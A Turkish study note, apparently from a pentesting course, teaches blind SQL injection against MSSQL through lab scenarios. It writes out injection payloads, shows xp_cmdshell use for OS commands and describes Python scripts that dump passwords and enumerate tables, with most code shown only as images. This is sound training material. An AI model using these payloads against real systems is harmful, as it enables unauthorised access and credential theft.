---
{"dg-publish":true,"permalink":"/web-pentest-expert/blind-sql-injection/"}
---



### Introduction to MSSQL/SQL Server

SQL, ilişkisel veritabanları ile etkileşim için standartlaştırılmış bir dildir. En yaygın beş tanesi ([15 Aralık 2022 itibarıyla](https://db-engines.com/en/ranking/relational+dbms)) şunlardır:

1. Oracle 
2. MySQL 
3. Microsoft SQL Server 
4. PostgreSQL 
5. IBM Db2

Bu modülde, Microsoft SQL Server'daki (MSSQL) örnekleri kullanarak blind SQL injection saldırılarına odaklanacağız. Buna ek olarak, MSSQL'e özgü saldırıları da ele alacağız. SQL standartlaştırıldığından, bu modülde öğretilen saldırılar diğer ilişkisel veritabanlarına karşı çalışmak için kolayca uyarlanabilir.


### MSSQL ile etkileşim

Bu modülün geri kalanında web siteleri aracılığıyla enjeksiyon güvenlik açıklarıyla ilgilenecek olsak da, MSSQL/SQLServer ile komut satırı veya GUI uygulaması aracılığıyla doğrudan nasıl etkileşim kurulacağını anlamak yararlı olacaktır

Not: Bu ileri düzey bir SQL modülü olduğundan, SQL'in temellerini zaten anlamış olmanız ve kendiniz sorgu oluşturmakta rahat olmanız beklenmektedir.


### SQLCMD (Windows, Command Line)

[SQLCMD](https://learn.microsoft.com/en-us/sql/tools/sqlcmd/sqlcmd-utility?view=sql-server-ver16), MSSQL ile etkileşim için Microsoft tarafından geliştirilen Windows için bir komut satırı aracıdır.

Bir SQL Server'a bağlanmak için aşağıdaki syntax'ı kullanabiliriz. Bu durumda, SQL01 server'ındaki bsqlintro veritabanına thomas:TopSecretPassword23 kimlik bilgileriyle bağlanıyoruz! . Son bayrak ( -W ) sondaki boşlukları kaldırır, bu da çıktının okunmasını biraz daha kolaylaştırır.

![Pasted image 20241213045153.png](/img/user/resimler/Pasted%20image%2020241213045153.png)

Bu komut, `sqlcmd` ile `SQL01` sunucusundaki `bsqlintro` veritabanına `thomas` kullanıcısı ve belirtilen parola ile bağlanır. `-W`, çıktıyı sadeleştirir.

SQL sorgularını çalıştırmak için bunları girmeniz ve çalıştırmak için sonuna GO (varsayılan batch separator) yazmanız yeterlidir. Bu örnekte, tüm tablo bilgilerini ve ardından posts tablosuyla birleştirilmiş users tablosundan ilk 5 gönderiyi seçiyoruz.

![Pasted image 20241213045252.png](/img/user/resimler/Pasted%20image%2020241213045252.png)

[[Ne Yapıyor  \|Ne Yapıyor  ]]

### Impacket-MSSQLClient (Linux, Command Line)

[MSSQLClient.py](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) (veya impacket-mssqlclient), güvenlikle ilgili birçok linux dağıtımında önceden yüklenmiş olarak gelen [Impacket](https://github.com/fortra/impacket) araç setinin bir parçasıdır. Windows kullanmak zorunda kalmadan remote MSSQL ile etkileşim kurmak için kullanabiliriz.

Bağlanmak için syntax şu şekildedir:

`impacket-mssqlclient thomas:'TopSecretPassword23!'@SQL01 -db bsqlintro`

Bu komut, `impacket-mssqlclient` aracını kullanarak `SQL01` sunucusundaki `bsqlintro` veritabanına, kullanıcı adı `thomas` ve parola `TopSecretPassword23!` ile bağlanmayı sağlar.

Sorguları her zamanki gibi çalıştırabiliriz:

![Pasted image 20241213062743.png](/img/user/resimler/Pasted%20image%2020241213062743.png)
![Pasted image 20241213062752.png](/img/user/resimler/Pasted%20image%2020241213062752.png)
![Pasted image 20241213062800.png](/img/user/resimler/Pasted%20image%2020241213062800.png)
![Pasted image 20241213062808.png](/img/user/resimler/Pasted%20image%2020241213062808.png)
![Pasted image 20241213062814.png](/img/user/resimler/Pasted%20image%2020241213062814.png)

MSSQLClient.py bir pen-test aracı olduğundan, MSSQL sunucularına saldırırken bize yardımcı olan birkaç özelliğe sahiptir. Örneğin, komutları çalıştırmak için xp_cmdshell'i etkinleştirebilir ve kullanabiliriz. Bunu modülün ilerleyen bölümlerinde ele alacağız.

![Pasted image 20241213062957.png](/img/user/resimler/Pasted%20image%2020241213062957.png)

`SQL>` adı altındaki komutlar, SQL Server üzerinde çalışan bir etkileşimli SQL komut satırıdır. Bu komutlar, SQL Server'a gönderilen sorgu ve komutları içerir. Örneğin:

1. **`enable_xp_cmdshell`**: SQL Server'da sistem komutlarını çalıştırmaya olanak sağlayan `xp_cmdshell` özelliğini etkinleştirir.
2. **`xp_cmdshell whoami`**: `xp_cmdshell` komutunu kullanarak, SQL Server'ın çalıştığı ortamda komut satırına `whoami` komutunu gönderir. Bu komut, kimlik doğrulaması yapılmış olan kullanıcının adını döndürür. Çıktıda `NT SERVICE\mssqlserver` gösteriyor, bu da SQL Server hizmetinin sistem hesabı altında çalıştığını belirtir.

Bu komutlar, SQL Server'da güvenlik açıklarını kullanarak sistem üzerinde daha fazla erişim sağlamak için kullanılır.



### SQL Server Management Studio (Windows, GUI)

[SQL Server Management Studio](https://learn.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver16), Microsoft tarafından MSSQL ile etkileşim için geliştirilmiş bir GUI aracıdır. Uygulamayı başlatırken bir sunucuya bağlanmamız istenir:


![Pasted image 20241213070127.png](/img/user/resimler/Pasted%20image%2020241213070127.png)

Bağlandıktan sonra Databases klasörünü açarak sunucudaki veritabanlarını görüntüleyebiliriz.

![Pasted image 20241213070150.png](/img/user/resimler/Pasted%20image%2020241213070150.png)

Belirli bir veritabanını ve ardından Tables klasörünü açarak tabloları listeleyebiliriz.

![Pasted image 20241213070220.png](/img/user/resimler/Pasted%20image%2020241213070220.png)

Bir veritabanında sorgu çalıştırmak için sağ tıklayıp New Query (Yeni Sorgu) seçeneğini seçebiliriz.

![Pasted image 20241213070242.png](/img/user/resimler/Pasted%20image%2020241213070242.png)

Sorguları yeni sekmeye girebilir ve Execute'e tıklayarak çalıştırabiliriz.

![Pasted image 20241213070334.png](/img/user/resimler/Pasted%20image%2020241213070334.png)


### Introduction to Blind SQL Injection

Non-Blind SQL enjeksiyonu, muhtemelen aşina olduğunuz tipik “ exploit edilmesi kolay” SQL enjeksiyonudur. Örnek olarak, veritabanındaki tüm tabloları listelemek için UNION SELECT table_name,table_schema FROM information_schema.tables;-- enjekte ederek istismar edebileceğiniz eşleşen gönderileri döndüren savunmasız bir arama özelliği verilebilir.

Blind SQL injection, saldırgana ilgili SQL sorgusunun sonuçlarının döndürülmediği bir SQL injection türüdür ve saldırganın sorgu sonuçlarını çıkarmak için sayfadaki farklılıklara güvenmesi gerekir. Bunun bir örneği, girdimizi bir veritabanı sorgusunda kullanan ancak çıktıyı bize döndürmeyen bir oturum açma formu olabilir.

Blind SQL Injection'ın iki kategorisi vardır:

* ***Boolean-based**, diğer adıyla **Content-based**, saldırganın injected sorgunun **True** veya **False** döndürdüğünü anlamak için yanıtlar arasındaki farkları (örneğin, **Response Length**) incelediği durumdur.
* **Time-based**, saldırganın sorguya farklı sürelerle **sleep** komutları enjekte ettiği ve ardından sorgunun **True** veya **False** olarak değerlendirilip değerlendirilmediğini anlamak için yanıt süresini kontrol ettiği durumdur.

**Blind SQLi**, geliştiricilerin kullanıcı girdisini bir sorguya dahil etmeden önce düzgün bir şekilde sanitize etmediği durumlarda, diğer SQL injection türlerinde olduğu gibi, meydana gelebilir. Dikkate değer bir nokta, tüm **time-based** tekniklerin **boolean-based** SQL injectionlarda kullanılabileceği, ancak bunun tersinin mümkün olmadığıdır.


### Example of Boolean-based SQLi

İşte, **email** POST parametresi üzerinden **boolean-based** SQL injection açığı barındıran bir PHP kodu örneği. SQL sorgusunun sonuçları döndürülmese de, sunucu sorgunun satır döndürüp döndürmediğine bağlı olarak **Email found** veya **Email not found** yanıtını verir. Bir saldırgan, bu durumu keyfi sorgular çalıştırmak ve sorgunun satır döndürüp döndürmediğini ( **true** veya **false** ) anlamak için yanıt içeriğini kontrol etmek amacıyla kötüye kullanabilir.

![Pasted image 20241213070902.png](/img/user/resimler/Pasted%20image%2020241213070902.png)



### Identifying the Vulnerability

#### Scenario

Aunt Maria's Donuts tarafından ticari web sitelerinin güvenlik açığı değerlendirmesini yapmak üzere görevlendirildik. Testin harici bir saldırganı mümkün olduğunca yakından simüle etmesini istedikleri için bize herhangi bir kullanıcı kimlik bilgisi verilmedi.

![Pasted image 20241213071040.png](/img/user/resimler/Pasted%20image%2020241213071040.png)

Ana sayfada hızlı bir tur attıktan sonra, bir kullanıcı oluşturmanın bize herhangi bir ek erişim sağlayıp sağlamayacağını görmek için kayıt sayfasına geçiyoruz.

![Pasted image 20241213071101.png](/img/user/resimler/Pasted%20image%2020241213071101.png)

Bir kullanıcı adı girdikten sonra, alanın altında 'moody' kullanıcı adı kullanılabilir metninin açıldığını görüyoruz. Bu, girilen kullanıcı adının zaten var olup olmadığını kontrol etmek için veritabanının sorgulanmış olabileceğini gösteriyor, bu yüzden kontrol etmeye değer.

![Pasted image 20241213071320.png](/img/user/resimler/Pasted%20image%2020241213071320.png)


### 'Kullanıcı Adı Kullanılabilirliği' Kontrolünün İncelenmesi

**signup.php** kaynak koduna baktığımızda, **usernameInput**'un, kullanıcı **username** alanından odağı başka bir yere kaydırdığında gerçekleşen **[onfocusout](https://www.w3schools.com/jsref/event_onfocusout.asp)** olayında **checkUsername()** fonksiyonunu çağırdığını görebiliriz.

---
Bu açıklama, bir web sayfasındaki **signup.php** dosyasına ait bir davranışı anlatıyor. Daha basit bir şekilde açıklayayım:

1. **usernameInput**: Kullanıcının bir kullanıcı adı girdiği form alanı (örneğin bir metin kutusu).
2. **onfocusout**: Kullanıcı, bu alan üzerinde yazmayı bırakıp başka bir yere tıkladığında veya tab tuşuyla başka bir alana geçtiğinde tetiklenen bir olay.
3. **checkUsername()**: Bir JavaScript fonksiyonu. Kullanıcının girdiği kullanıcı adını kontrol etmek için yazılmış olabilir (örneğin, mevcut bir kullanıcı adı mı, yoksa geçerli bir formatta mı diye kontrol edebilir).

---

![Pasted image 20241213071612.png](/img/user/resimler/Pasted%20image%2020241213071612.png)

Kaynak kodunda biraz daha aşağıda static/js/signup.js'ye bir referans görebiliriz.

![Pasted image 20241213071637.png](/img/user/resimler/Pasted%20image%2020241213071637.png)

Bu script'e daha yakından baktığımızda, checkUsername() fonksiyonunun tanımını görebiliriz.

![Pasted image 20241213071700.png](/img/user/resimler/Pasted%20image%2020241213071700.png)

[[Bağlantılar/Ayrıntılı Acıklma Chatgpt-1\|Ayrıntılı Acıklma Chatgpt-1]]

Yaptığı şey şu:

- `/api/check-username.php?u=<username>` adresine bir **GET** isteği gönderir.
- **usernameHelp** öğesini, **/api/check-username.php** yanıtına bağlı olarak verilen kullanıcı adının kullanılabilir mi yoksa alınmış mı olduğunu kullanıcıya bildirmek için günceller.

BurpSuite kullanarak birkaç farklı kullanıcı adı deneyebiliriz. Örneğin, **admin** ve **maria** her ikisi de **status: taken** döndürür. Ancak daha ilginç olan, bir kullanıcı adı olarak tek tırnak (') sağladığımızda sunucunun **Error 500: Internal Server Error** döndürmesidir.

![Pasted image 20241213071857.png](/img/user/resimler/Pasted%20image%2020241213071857.png)


### SQL Enjeksiyonu Zafiyetinin Doğrulanması

Bu, bir SQL enjeksiyonu açığının varlığına işaret etmektedir. Back-end'de değerlendirilen sorgu büyük olasılıkla şuna benzer

![Pasted image 20241213091006.png](/img/user/resimler/Pasted%20image%2020241213091006.png)

Bu mantıkla, ' veya '1'='1 enjekte etmek, sorgunun bir şey döndürmesini ve sunucunun bu ' username'in zaten alınmış olduğunu düşünmesini sağlamalıdır. Bu teoriyi Burp'te aşağıdaki isteği göndererek doğrulayabiliriz:

![Pasted image 20241213091051.png](/img/user/resimler/Pasted%20image%2020241213091051.png)

Bu durumda, boolean tabanlı bir SQL enjeksiyonu bulduk. İstediğimiz her şeyi enjekte edebiliriz, ancak sunucu yalnızca status:taken veya status:available ile yanıt verecektir, yani veritabanından çıkarmak istediğimiz verileri çıkarmak için “ Yes/No” sorularını kullanmaya güvenmek zorunda kalacağız.


### Oracle'ın Tasarlanması

Bir hedef kullanıcının şifresini dökmek için bulduğumuz blind SQLi'den yararlanacak bir script yazmak istiyoruz. İlk adımımız, sorgu gönderebileceğimiz ve true ya da false alabileceğimiz bir oracle tasarlamak.

Diyelim ki temel bir sorguyu ( q ) değerlendirmek istiyoruz. Sistemde maria kullanıcı adının var olduğunu bildiğimiz için, hedef sorgumuzun true veya false olarak değerlendirilip değerlendirilmediğini görmek için ' AND q-- - ekleyebiliriz. Bu işe yarar çünkü sunucunun maria için status:taken sonucunu vermesi gerektiğini biliyoruz ve bu nedenle status:taken olarak kalırsa q doğru olarak değerlendirilir ve status:available döndürürse q yanlış olarak değerlendirilir anlamına gelir.


`SELECT Username FROM Users WHERE Username = 'maria' AND q-- -'`

Örneğin, 1=1 sorgusunu test etmek için maria' AND 1=1-- - enjekte edebiliriz ve sunucunun bunu doğru olarak değerlendirdiğini gösteren status:taken sonucunu alırız.

![Pasted image 20241213091352.png](/img/user/resimler/Pasted%20image%2020241213091352.png)

Aynı şekilde, maria' AND 1=0-- - sorgusunu enjekte ederek 1=0 sorgusunu test edebilir ve sunucunun bunu yanlış olarak değerlendirdiğini gösteren status:available yanıtını alabiliriz.

![Pasted image 20241213091442.png](/img/user/resimler/Pasted%20image%2020241213091442.png)

Not: Bu web uygulaması için maria veya kaydettiğimiz başka bir kullanıcı gibi zaten alınmış bir kullanıcı adı kullanmalıyız. Bunun nedeni, true döndüren bir sorgunun bize alınmış kullanıcı adını vermesidir. Aksi takdirde, alınmamış bir kullanıcı adı kullanırsak, doğru veya yanlış olsun, herhangi bir sorgunun çıktısı mevcut olacaktır.

Python'da bunu aşağıdaki gibi kodlayabiliriz. oracle(q) fonksiyonu payload'umuzu ( maria' AND (q)-- - ) URL-encode eder ve daha sonra bunu api/check-username.php adresine bir GET isteği olarak gönderir. Yanıtı aldıktan sonra, sırasıyla doğru veya yanlış sorgu değerlendirmelerini gösteren status değerinin alınıp alınmadığını veya kullanılabilir olup olmadığını kontrol eder.


![Pasted image 20241213091907.png](/img/user/resimler/Pasted%20image%2020241213091907.png)

[[Bağlantılar/Kod açıklaması -2\|Kod açıklaması -2]]

Soru : Kullanıcı tablosundaki satır sayısını bulmak için oracle'ı kullanın. Aşağıdaki sorguyu temel olarak kullanabilirsiniz:

![Pasted image 20241213092618.png](/img/user/resimler/Pasted%20image%2020241213092618.png)



### Veri Çıkarma

### Uzunluğu Bulma

Artık çalışan bir oracle'ımız olduğuna göre, şifreleri dökmek için çalışmaya başlayabiliriz! Yapmamız gereken ilk şey şifrenin uzunluğunu bulmak. Bunu LEN(string) kullanarak, 1'den başlayıp pozitif bir sonuç elde edene kadar devam ederek yapabiliriz.

![Pasted image 20241213092740.png](/img/user/resimler/Pasted%20image%2020241213092740.png)

Artık işleyen bir oracle'ımız olduğuna göre, şifre dökümü üzerinde çalışmaya başlayabiliriz! Yapmamız gereken ilk şey şifrenin uzunluğunu bulmak. Bunu LEN(string) kullanarak, 1'den başlayıp pozitif bir sonuç elde edene kadar devam ederek yapabiliriz.

![Pasted image 20241213092827.png](/img/user/resimler/Pasted%20image%2020241213092827.png)


### Dumping the Characters

Damping yapmak istediğimiz şifrenin uzunluğunu bilerek, her seferinde bir karakter damping yapmaya başlayabiliriz. SQL'de [SUBSTRING(expression, start, length)](https://learn.microsoft.com/en-us/sql/t-sql/functions/substring-transact-sql?view=sql-server-ver16) ile bir sütundan tek bir karakter alabiliriz. Bu durumda şifrenin N'inci karakteriyle ilgileniyoruz, bu yüzden SUBSTRING(şifre, N, 1) kullanacağız.

Daha sonra, işleri biraz daha basitleştirmek için, [ASCII(karakter)](https://learn.microsoft.com/en-us/sql/t-sql/functions/ascii-transact-sql?view=sql-server-ver16) kullanarak bu karakteri ondalık bir değere dönüştürebiliriz. [ASCII](https://www.asciitable.com/) karakterleri 0 ila 127 arasında ondalık değerlere sahiptir, bu nedenle sunucuya [0,127] içindeki C değerleri için ASCII(SUBSTRING(password, N, 1))=C olup olmadığını sorabiliriz.

İlk olarak, bu saldırının nasıl çalıştığını daha iyi anlamak için ilk karakteri manuel olarak dump etmeye çalışalım. İlk karakterle 1 konumundan başlayalım ( SUBSTRING(password, 1, 1) ) ve ASCII tablosundaki ilk karakteri 0 değeriyle deneyelim. Bu, aşağıdaki SQL sorgusunu oluşturacaktır:

![Pasted image 20241213093207.png](/img/user/resimler/Pasted%20image%2020241213093207.png)

Şimdi, yukarıdaki enjeksiyonla bir sorgu gönderirsek, kullanılabilir , yani ilk karakter ASCII karakteri 0 değildir:

![Pasted image 20241213093244.png](/img/user/resimler/Pasted%20image%2020241213093244.png)

İlk ASCII karakteri boş karakter olduğu için bu beklenen bir durumdur. Bu nedenle, aramamızı 32 ila 126 arasında değişen yazdırılabilir ASCII karakterleriyle sınırlamak daha mantıklı olabilir. Geçerli bir eşleşmeyi göstermek için, parolanın ilk karakterinin 9 sayısı veya ASCII tablosunda 57 olduğunu varsayacağız. Bu kez, sorguyu gönderdiğimizde, geçerli bir eşleşme elde ettiğimiz ve parola alanındaki 1. karakterin ASCII'de 57 veya 9 karakteri olduğu anlamına gelir:

![Pasted image 20241213093356.png](/img/user/resimler/Pasted%20image%2020241213093356.png)


### Otomatikleştirme
Python scriptimizde bu şekilde görünmelidir:

![Pasted image 20241213093434.png](/img/user/resimler/Pasted%20image%2020241213093434.png)

Komut dosyamızı çalıştırdığımızda artık hem parola uzunluğunu hem de parolanın tamamını almamız gerekir. Bu oldukça uzun sürecektir; bekleyebilir ya da Optimizasyon bölümüne göz atıp buraya geri dönebilirsiniz

![Pasted image 20241213093515.png](/img/user/resimler/Pasted%20image%2020241213093515.png)



### Optimizing

#### Hız İhtiyacı

Yazdığımız script çalışmasına rağmen verimsiz ve yavaştır. Script toplamda 4128 istek gönderiyor ve 1005.671 saniye sürüyor. Bu bölümde, bu sayıları büyük ölçüde iyileştirmek için kullanabileceğimiz iki algoritmayı tanıtacağız.


#### Bisection

Bisection blind SQL injection algoritması, sadece bir seçenek kalana kadar arama alanını tekrar tekrar ikiye bölerek çalışır. Bu durumda, arama alanı tüm olası ASCII değerleridir, yani 0-127 . ASCII değeri 45'e eşit olan '-' karakteri olan şifrenin 1. karakterini dökmeye çalıştığımızı düşünelim.

![Pasted image 20241213093832.png](/img/user/resimler/Pasted%20image%2020241213093832.png)

Arama alanının alt ve üst sınırlarını sırasıyla 0 ve 127 olarak ayarlıyoruz ve orta noktayı hesaplıyoruz (gerekirse aşağı yuvarlıyoruz). Ardından, SQL enjeksiyonumuzu kullanarak ASCII(SUBSTRING(password,1,1)) BETWEEN `<LBound>` AND `<Midpoint>` sorgusunu değerlendiriyoruz. Basitçe sunucuya karakterimizin bu aralıkta olup olmadığını soruyoruz ve eğer öyleyse, tüm dış karakterleri hariç tutabilir ve karakterimizin konumunu bulana kadar aralığı azaltmaya devam edebiliriz

Bunlar, hedef karakteri dump etmek için göndereceğimiz yedi istektir:

![Pasted image 20241213093953.png](/img/user/resimler/Pasted%20image%2020241213093953.png)
![Pasted image 20241213094015.png](/img/user/resimler/Pasted%20image%2020241213094015.png)

Hedef değerin artık LBound'da depolandığını ve son bölümde yazdığımız script'in alacağı 45 yerine sadece 7 istek aldığını görebiliriz.

İpucu: Önceki bölümde yaptığımız gibi, karakterleri yazdırılabilir ASCII karakterleriyle sınırlamak için alt sınırı 32 olarak da ayarlayabilirsiniz. 

Bu algoritmayı kodumuzda uygulamak çok zor değildir. Sadece önce önceki döngüyü yorumladığınızdan emin olun.

![Pasted image 20241213094116.png](/img/user/resimler/Pasted%20image%2020241213094116.png)
![Pasted image 20241213094121.png](/img/user/resimler/Pasted%20image%2020241213094121.png)

Toplamda, ikiye bölme algoritması maria'nın şifresini dökmek için 256 istek ve 61.556 saniye gerektirir. Bu büyük bir gelişme.


### SQL-Anding

SQL-Anding, gerekli istek sayısını azaltmak için kullanabileceğimiz başka bir algoritmadır. Biraz ikili düşünmeyi gerektirir. ASCII karakterleri 0-127 değerlerine sahiptir ve bu değerler ikilik olarak 00000000-01111111 şeklindedir. En anlamlı bit her zaman 0 olduğundan, bu bitlerden yalnızca 7 tanesini boşaltmamız gerekir. Sunucunun, hedeflenen bit 1 ise doğru, bit 0 ise yanlış olan bitwise-and sorgularını değerlendirmesini sağlayarak bitleri boşaltabiliriz.


Örneğin, 23 sayısı ikili olarak 00010111 şeklindedir, bu nedenle 23 & 4 4 ve 23 & 8 0'dır. ASCII(SUBSTRING(password,N,1)) & X) gibi bir sorgu oluşturabiliriz 2^X'e karşılık gelen bitin 1 mi yoksa 0 mı olduğunu görmek için şifrenin N'inci karakterinin bitwise-and X'in 0'dan büyük olup olmadığını test etmek için > 0 .

Bu tekniğin 9 karakterini boşaltmak için kullanımına bir örnek şuna benzer:

![Pasted image 20241213192427.png](/img/user/resimler/Pasted%20image%2020241213192427.png)
![Pasted image 20241213192432.png](/img/user/resimler/Pasted%20image%2020241213192432.png)

Bu algoritmayı Python scriptimizde şu şekilde uygulayabiliriz. Bir kez daha, önceki döngüleri yorumlamayı unutmayın

![Pasted image 20241213192454.png](/img/user/resimler/Pasted%20image%2020241213192454.png)

Bu algoritma, ikiye bölme algoritması gibi 256 istek alır, ancak sorgunun daha hızlı çalışan talimatlar kullanması nedeniyle 60,281 saniyede çok az daha hızlı çalışır.


### Daha Fazla Optimizasyon

Bu algoritmalar zaten büyük bir gelişme olsa da, bu sadece başlangıç. Multithreading ile bunları daha da geliştirebiliriz.

İkiye bölme durumunda , bir karakteri boşaltmak için gönderdiğimiz 7 isteğin hepsi birbirine bağlıdır, bu nedenle sırayla gönderilmeleri gerekir, ancak tek tek karakterler bağımsızdır ve bu nedenle bağımsız thread'lerde boşaltılabilir.

SQL-Anding söz konusu olduğunda, bir karakteri dump etmek için yapılan 7 isteğin hepsi birbirinden bağımsızdır ve tüm karakterler birbirinden bağımsızdır, bu nedenle göndermemiz gereken tüm isteklerin paralel çalışmasını sağlayabiliriz.

Bu konu hakkında daha fazla bilgi edinmek istiyorsanız, [bu](https://www.youtube.com/watch?v=zRBFpCvx1uM) videoya göz atabilirsiniz.


### Identifying the Vulnerability

### Scenario

Digcraft Hosting, web sitelerinin güvenlik değerlendirmesini yapmamızı istedi.

![Pasted image 20241213192734.png](/img/user/resimler/Pasted%20image%2020241213192734.png)


### Playing with **Headers**

Web sitesine baktığımızda kullanıcı girişi için herhangi bir kaynak yok gibi görünüyor, ancak HTTP başlıklarını test etmeyi unutmamalıyız! Eğer herhangi bir özel başlık varsa, sunucu tarafından mutlaka kullanıldıkları için önce bunlara bakmalıyız ve daha sonra Host, User-Agent ve X-Forwarded-For gibi kullanılabilecek yaygın olanları deneyebiliriz.

Bu durumda, özellikle time-based MSSQL enjeksiyonlarını aramak istiyoruz . Bunu yapmak için header değerlerinde aşağıdaki payload'u kullanabiliriz:

![Pasted image 20241213193904.png](/img/user/resimler/Pasted%20image%2020241213193904.png)

[WAITFOR](https://learn.microsoft.com/en-us/sql/t-sql/language-elements/waitfor-transact-sql?view=sql-server-ver16), SQL sorgusunu belirli bir zamana kadar engelleyen bir anahtar sözcüktür; burada 10 saniyelik bir gecikme belirtiyoruz.

İstek başlıklarıyla oynadıktan sonra sonunda User-Agent başlığında time-based bir SQL enjeksiyonu tespit ettik


![Pasted image 20241213194012.png](/img/user/resimler/Pasted%20image%2020241213194012.png)

Başka bir sorgu göndererek ve sonucun daha hızlı geldiğini doğrulayarak 10 saniyelik beklemeye neden olan şeyin enjekte ettiğimiz payload olduğundan emin olabiliriz.

![Pasted image 20241213194043.png](/img/user/resimler/Pasted%20image%2020241213194043.png)



### Payloads

Time-based injections elbette MSSQL'e özgü değildir, ancak sözdizimi her dil için biraz farklılık gösterir, bu nedenle burada diğer DBMS'ler için kullanabileceğimiz bazı örnek payload'lar bulunmaktadır:

![Pasted image 20241213194751.png](/img/user/resimler/Pasted%20image%2020241213194751.png)


### Oracle Tasarım

### Theory

Bu durumda, UserAgent headerındaki enjeksiyondan sonuçlar veya SQL hata mesajları görüntülenmiyor. Bildiğimiz tek şey, sorgunun senkron olarak çalışmadığıdır çünkü sayfanın geri kalanı, bize dönmeden önce onun tamamlanmasını bekler. Bu durumda veri çıkarmak için, sunucunun sorguları değerlendirmesini ve ardından sonuca bağlı olarak farklı süreler beklemesini sağlayabiliriz. Örneğin, sorgu `q`'nun doğru mu yanlış mı olduğunu bilmek istediğimizi varsayalım. User-Agent'ı ayarlayarak aşağıdaki gibi bir sorgunun çalıştırılmasını sağlayabiliriz. Eğer `q` doğruysa, sunucu yanıt vermeden önce 5 saniye bekleyecek ve `q` yanlışsa sunucu hemen yanıt verecektir.

![Pasted image 20241213194950.png](/img/user/resimler/Pasted%20image%2020241213194950.png)

Örneğin, 1=0 ve 1=1 sorgularını bir kez daha test edelim. İlk olarak, False sorgusunu (örn. 1=0 ) test etmek herhangi bir gecikmeye neden olmaz ve aşağıda gösterildiği gibi anında yanıt alırız:

![Pasted image 20241213195016.png](/img/user/resimler/Pasted%20image%2020241213195016.png)

Şimdi, True ile sonuçlanan bir sorguyu test edersek (örn. 1=1 ), aşağıda gösterildiği gibi belirttiğimiz süre kadar gecikmeli bir yanıt alırız:

![Pasted image 20241213195055.png](/img/user/resimler/Pasted%20image%2020241213195055.png)

Doğru veya yanlış olduğunu doğrulamak için aynı kavramı herhangi bir SQL sorgusu ile kullanabiliriz.


### Practice

Python'da bunu şu şekilde kodlayabiliriz. Bu injection zamana dayalı olduğu için DELAY değeri ile oynamanız gerekebilir. Yukarıdaki durumda 1 saniye kullandık, ancak internet/VPN hızlarına bağlı olarak daha fazla saniyeye ihtiyacınız olabilir. Time-based enjeksiyonlar söz konusu olduğunda, gecikme ne kadar uzun olursa, sonuçlarınız o kadar doğru olacaktır. Örneğin, 1 saniyelik bir gecikme kullandıysanız ve sunucu sadece bir istekte yavaş yanıt verdiyse, sunucunun yavaş olmasından ziyade enjeksiyonun gecikmeye neden olduğunu düşünebilirsiniz. Elbette daha uzun bir gecikme, damping işleminin daha uzun sürmesi anlamına gelecektir, bu nedenle bu, göz önünde bulundurmanız gereken bir değiş tokuştur.

![Pasted image 20241213195340.png](/img/user/resimler/Pasted%20image%2020241213195340.png)


### Question

db_name()'in beşinci harfinin ne olduğunu bulmak için oracle'ı kullanın (İpucu: küçük harftir). Aşağıdaki sorguyu temel olarak kullanabilirsiniz:

![Pasted image 20241213195510.png](/img/user/resimler/Pasted%20image%2020241213195510.png)


## Data Extraction (Veri Kazıma)

### Enumerating Database Name

Maria Teyze'nin Donutları örneğinde, doğrudan Maria'nın parolasını dump etmeye gittik. Ancak bu, parola sütununun adını tahmin etmeyi ve kullanıcılar tablosundan seçim yaptığımızı varsaymayı içeriyordu. Bu durumda, User-Agent'ı içermesi dışında çalıştırılan sorgu hakkında hiçbir şey bilmiyoruz.

Bu nedenle, önce veritabanlarını/tabloları/sütunları listelemek ve ardından neyin dump edilmeye değer olabileceğine bakmak istiyoruz. Yapmak istediğimiz ilk şey, içinde bulunduğumuz veritabanının adını dump etmektir. Kodu, bir sayının değerini (256'dan küçük) dökmemize ve ardından LEN(DB_NAME()) değerini almak için çağırmamıza olanak tanıyan aşağıdaki fonksiyonla genişletelim.

![Pasted image 20241213195651.png](/img/user/resimler/Pasted%20image%2020241213195651.png)


Time-based enjeksiyonlarla uğraşırken, Optimizasyon bölümünde tartıştığımız algoritmalar değerlerini gösterir: ikiye bölme veya SQL-anding ile 7 sorgu çalıştırmak 7 saniye sürebilirken, basit bir döngü kullansaydık 100+ saniye sürebilirdi. Bu zaten sadece tek bir karakterin dump edilmesi için dakikalar süren bir farktır! Bu durumda, biz yine SQL-Anding kullanmayı seçtik, ancak farklı bir algoritma kullanmayı tercih ederseniz çekinmeyin. Bu zaman tabanlı bir enjeksiyon olduğundan, sonuçlar ne yazık ki boolean tabanlı örnekten çok daha yavaş gelecektir, ancak birkaç saniye sonra bir cevap almalıyız.

![Pasted image 20241213195757.png](/img/user/resimler/Pasted%20image%2020241213195757.png)

DB_NAME()'in uzunluğunu bilerek string değerini dump edebiliriz. dumpLength çağrısını değerle değiştirdiğinizden emin olun, böylece tekrar çalıştırmayız.

![Pasted image 20241213195834.png](/img/user/resimler/Pasted%20image%2020241213195834.png)

Komut dosyasını bir kez daha çalıştırdığımızda veritabanının adını almalıyız.

![Pasted image 20241213195909.png](/img/user/resimler/Pasted%20image%2020241213195909.png)


### Enumerating Table Names

Artık digcraft veritabanında sorgular yürüttüğümüzü biliyoruz. Daha sonra, hangi tabloların mevcut olduğunu bulalım. İlk olarak, tablo sayısını dökmemiz gerekiyor. Çalıştırmamız gereken sorgu şuna benziyor:

![Pasted image 20241213200031.png](/img/user/resimler/Pasted%20image%2020241213200031.png)

Scriptimiz ile bu değeri şu şekilde alabiliriz:

![Pasted image 20241213200106.png](/img/user/resimler/Pasted%20image%2020241213200106.png)

Cevap 2 olmalı.

![Pasted image 20241213200128.png](/img/user/resimler/Pasted%20image%2020241213200128.png)

Her tablonun uzunluğunu alalım ve sonra adını dump edelim. Bu sorgu oldukça çirkin görünecektir çünkü MSSQL, örneğin MySQL gibi OFFSET/LIMIT'e sahip değildir. Burada bir tablo_adının uzunluğunu dump ediyoruz, sonuçları table_name'e göre sıralıyoruz, 0 satıra göre offset yapıyoruz. İkinci tabloyu dump etmek için offset değerini 1'e ayarlıyoruz.

![Pasted image 20241213200222.png](/img/user/resimler/Pasted%20image%2020241213200222.png)

Kodumuza bir döngü ekleyelim (zaman kazanmak için diğer sorguları yorumlamayı unutmayın). Önce i^'inci tablonun adının uzunluğunu, sonra da string değerini birbiri ardına dökeceğiz.

![Pasted image 20241213200327.png](/img/user/resimler/Pasted%20image%2020241213200327.png)

Bunu çalıştırmak bize her iki tablonun da adını vermelidir.

![Pasted image 20241213200340.png](/img/user/resimler/Pasted%20image%2020241213200340.png)


### Enumerating Column Names

